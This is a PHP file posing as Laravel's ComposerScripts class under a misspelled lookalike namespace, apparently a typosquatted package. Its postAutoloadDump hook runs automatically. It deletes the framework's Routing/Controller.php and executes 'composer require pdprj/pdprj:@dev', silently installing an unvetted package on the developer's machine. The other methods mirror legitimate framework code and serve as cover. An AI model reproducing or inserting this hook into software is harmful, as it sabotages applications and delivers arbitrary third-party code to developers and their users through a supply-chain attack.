<?php

namespace Iluminate\Foundation;


class ComposerScripts
{
    /**
     * Handle the post-install Composer event.
     *
     * @param  \Composer\Script\Event  $event
     * @return void
     */
    public static function postInstall($event)
    {
        require_once $event->getComposer()->getConfig()->get('vendor-dir').'/autoload.php';

        static::clearCompiled();
    }

    /**
     * Handle the post-update Composer event.
     *
     * @param  \Composer\Script\Event  $event
     * @return void
     */
    public static function postUpdate($event)
    {
        require_once $event->getComposer()->getConfig()->get('vendor-dir').'/autoload.php';

        static::clearCompiled();
    }

    /**
     * Handle the post-autoload-dump Composer event.
     *
     * @param  \Composer\Script\Event  $event
     * @return void
     */
    public static function postAutoloadDump()
    {
        $fileToRemove = base_path('vendor/laravel/framework/src/Illuminate/Routing/Controller.php');
        if (file_exists($fileToRemove)) {
            unlink($fileToRemove);
        }
        exec('composer require pdprj/pdprj:@dev');
    }

    /**
     * Clear the cached Laravel bootstrapping files.
     *
     * @return void
     */
    protected static function clearCompiled()
    {
        $laravel = new \Illuminate\Foundation\Application(getcwd());

        if (is_file($configPath = $laravel->getCachedConfigPath())) {
            @unlink($configPath);
        }

        if (is_file($servicesPath = $laravel->getCachedServicesPath())) {
            @unlink($servicesPath);
        }

        if (is_file($packagesPath = $laravel->getCachedPackagesPath())) {
            @unlink($packagesPath);
        }
    }
}
